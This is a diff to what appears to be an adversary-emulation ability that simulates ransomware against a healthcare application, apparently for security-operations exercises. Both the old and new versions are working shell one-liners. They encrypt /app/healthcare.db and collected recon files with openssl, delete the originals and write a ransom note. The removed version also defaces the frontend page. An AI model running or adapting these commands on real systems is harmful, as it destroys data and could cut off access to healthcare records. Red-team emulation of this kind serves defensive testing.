@@ -1,6 +1,6 @@
 - id: "impact-sim-encrypt"
   name: "Encrypt Collected Data"
-  description: "Encrypts collected healthcare data and drops a ransom note."
+  description: "Encrypts the healthcare database and collected recon files, and drops a ransom note. Does NOT tamper with the frontend so the SOC dashboard remains observable."
   tactic: "impact"
   technique:
     attack_id: "T1486"
@@ -9,5 +9,4 @@
     linux:
       sh:
         timeout: 120
-        command: |
-          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; DB_FILE="/app/healthcare.db"; FRONTEND_INDEX="/app/frontend/index.html"; echo "$R_KEY" > "$K_FILE"; echo "[!] Starting encryption of live system..."; if [ -f "$DB_FILE" ]; then openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$DB_FILE" -out "$DB_FILE.ransom" && rm "$DB_FILE" && echo "[!] DATABASE ENCRYPTED: $DB_FILE"; fi; if [ -f "$FRONTEND_INDEX" ]; then echo '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#ff0000;font-family:monospace;text-align:center;padding-top:100px;"><h1>☣️ SYSTEM ENCRYPTED ☣️</h1><h2>Your healthcare records have been locked.</h2><p>Contact us for the decryption key.</p></body></html>' > "$FRONTEND_INDEX" && echo "[!] FRONTEND DEFACED"; fi; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz; do [ -f "$f" ] || continue; openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.ransom" && rm "$f" && echo "[!] Encrypted: $f"; done; echo "========================================" > "$OUTDIR/README_DECRYPT.txt"; echo "  YOUR FILES HAVE BEEN ENCRYPTED" >> "$OUTDIR/README_DECRYPT.txt"; echo "========================================" >> "$OUTDIR/README_DECRYPT.txt"; echo "The database and all backups are gone." >> "$OUTDIR/README_DECRYPT.txt"; echo "Encryption key: $R_KEY" >> "$OUTDIR/README_DECRYPT.txt"; cat "$OUTDIR/README_DECRYPT.txt"
+        command: OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; DB_FILE="/app/healthcare.db"; mkdir -p "$OUTDIR"; echo "$R_KEY" > "$K_FILE"; echo "[!] Starting encryption of live system..."; if [ -f "$DB_FILE" ]; then openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$DB_FILE" -out "$DB_FILE.ransom" && rm "$DB_FILE" && echo "[!] DATABASE ENCRYPTED: $DB_FILE"; fi; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz; do [ -f "$f" ] || continue; openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.ransom" && rm "$f" && echo "[!] Encrypted: $f"; done; printf "========================================\n  YOUR FILES HAVE BEEN ENCRYPTED\n========================================\nThe database and all backups are gone.\nEncryption key ID: %%s\nContact: ransomware@darknet.example\n" "$R_KEY" > "$OUTDIR/README_DECRYPT.txt"; cat "$OUTDIR/README_DECRYPT.txt"
